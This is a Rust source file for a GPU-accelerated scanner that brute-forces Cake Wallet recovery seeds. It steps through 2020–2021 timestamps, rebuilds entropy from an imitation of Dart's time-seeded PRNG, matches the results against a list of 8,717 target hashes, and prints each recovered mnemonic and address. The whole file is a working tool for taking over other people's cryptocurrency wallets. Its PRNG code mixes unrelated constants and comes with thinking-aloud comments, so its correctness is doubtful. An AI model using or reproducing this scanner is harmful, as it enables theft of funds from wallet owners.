use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
use bip39::Mnemonic;
use hex;
use std::fs;

/// Cake Wallet Dart PRNG Scanner (Full GPU)
/// Scans 2020-2021 timestamps to find the 8,717 vulnerable seeds
pub fn run() -> Result<()> {
    println!("Cake Wallet Dart PRNG Scanner (Full GPU)");
    println!("Reverse-engineering vulnerable seeds from time-based PRNG...");

    // Load 8,717 target hashes
    println!("Loading vulnerable mnemonic hashes...");
    let hashes_file = fs::read_to_string("cakewallet_vulnerable_hashes.txt")?;

    // Parse and sort hashes for binary search
    let mut target_hashes: Vec<Vec<u8>> = hashes_file
        .lines()
        .map(|line| line.trim().to_lowercase())
        .filter(|line| !line.is_empty())
        .map(|line| hex::decode(line).unwrap_or_default())
        .filter(|h| h.len() == 32)
        .collect();

    target_hashes.sort();

    println!("Loaded and sorted {} target hashes", target_hashes.len());

    // Flatten hashes for GPU
    let mut flat_hashes = Vec::with_capacity(target_hashes.len() * 32);
    for hash in &target_hashes {
        flat_hashes.extend_from_slice(hash);
    }

    // Time range (microseconds)
    let start_time_us = 1577836800000000u64; // 2020-01-01 00:00:00 UTC
    let end_time_us = 1619913599999999u64; // 2021-05-01 23:59:59 UTC

    // Convert to seconds for iteration
    let start_sec = start_time_us / 1_000_000;
    let end_sec = end_time_us / 1_000_000;
    let total_seconds = end_sec - start_sec;

    println!(
        "Time range: {} to {} ({} seconds)",
        start_sec, end_sec, total_seconds
    );
    println!(
        "Sampling 5 microsecond offsets per second = {} total iterations",
        total_seconds * 5
    );

    // Initialize GPU
    let solver = GpuSolver::new()?;
    println!("[GPU] Solver initialized");

    // Batch processing
    let batch_size = 10_000_000; // 10M timestamps per batch (Full GPU is fast)
    let mut batch_timestamps: Vec<u64> = Vec::with_capacity(batch_size);

    let micro_offsets = [0, 100000, 200000, 500000, 999999]; // 5 samples per second
    let mut total_checked = 0;
    let mut found_count = 0;

    let start_time = std::time::Instant::now();

    for timestamp_sec in start_sec..=end_sec {
        for &micro_offset in &micro_offsets {
            let timestamp_us = timestamp_sec * 1_000_000 + micro_offset;
            batch_timestamps.push(timestamp_us);

            // Process batch when full
            if batch_timestamps.len() >= batch_size {
                process_batch_gpu(&solver, &batch_timestamps, &flat_hashes, &mut found_count)?;
                total_checked += batch_timestamps.len();

                let elapsed = start_time.elapsed().as_secs_f64();
                let speed = total_checked as f64 / elapsed;

                eprintln!(
                    "Progress: {}/{} seconds ({:.2}%) - Speed: {:.2} M/s - Found: {}",
                    timestamp_sec - start_sec,
                    total_seconds,
                    ((timestamp_sec - start_sec) as f64 / total_seconds as f64) * 100.0,
                    speed / 1_000_000.0,
                    found_count
                );

                batch_timestamps.clear();
            }
        }
    }

    // Final batch
    if !batch_timestamps.is_empty() {
        process_batch_gpu(&solver, &batch_timestamps, &flat_hashes, &mut found_count)?;
        total_checked += batch_timestamps.len();
    }

    println!("\nScan complete!");
    println!("Total iterations: {}", total_checked);
    println!("Vulnerable seeds found: {}", found_count);

    Ok(())
}

fn process_batch_gpu(
    solver: &GpuSolver,
    timestamps: &[u64],
    flat_hashes: &[u8],
    found_count: &mut usize,
) -> Result<()> {
    // Run Full GPU Search
    let results = solver.compute_cake_hash(timestamps, flat_hashes)?;

    for &timestamp_us in &results {
        *found_count += 1;
        println!("\n🎯 FOUND VULNERABLE SEED #{}", found_count);
        println!("  Timestamp: {} microseconds", timestamp_us);

        // Verify on CPU (Double check)
        let entropy = generate_dart_entropy(timestamp_us);
        if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
            println!("  Mnemonic: {}", mnemonic);

            // Generate address via GPU (purpose=200) for final output
            // We construct a single-item batch for address generation
            let mut entropy_padded = [0u8; 16];
            entropy_padded[0..8].copy_from_slice(&timestamp_us.to_le_bytes());
            // Note: batch_address.cl expects timestamp in entropies_hi (bytes 8..16) for purpose=200?
            // Let's check batch_address.cl:
            // "ulong timestamp_us = entropies_hi[idx];"
            // So yes, we need to put it in 8..16.
            // Wait, in cake_hash.cl we passed timestamp directly.
            // But for address generation we use batch_address.cl.
            // So we need to pack it correctly.

            // Actually, let's just use CPU for address generation here since it's just 1 match.
            // Or use the existing solver.compute_batch but pack correctly.

            // Let's pack into 8..16 for batch_address.cl
            let mut ent_for_addr = [0u8; 16];
            ent_for_addr[8..16].copy_from_slice(&timestamp_us.to_le_bytes());

            let addresses = solver.compute_batch(&[ent_for_addr], 200)?;
            if let Some(addr) = addresses.first() {
                println!("ADDRESS: {}", hex::encode(addr));
            }
        }
    }

    Ok(())
}

fn generate_dart_entropy(seed: u64) -> [u8; 16] {
    // Dart xorshift128+ implementation
    let mut state0 = seed;
    let mut state1 = seed ^ 0x5DEECE66D;

    let mut entropy = [0u8; 16];
    for byte in &mut entropy {
        // next_u64
        let s0 = state0;
        let s1 = state1 ^ s0;
        let result = s0.wrapping_add(state1);

        state0 = s0.rotate_left(55) ^ s1 ^ (s1 << 14);
        state1 = s1.rotate_left(36);

        // next_int(256)
        // Manual 128-bit mul logic from kernel
        let x = result;
        let x_hi = x >> 32;
        let x_lo = x & 0xFFFFFFFF;
        let max = 256;
        let res = (x_hi * max) + ((x_lo * max) >> 32);
        *byte = (res >> 32) as u8;
    }

    entropy
}
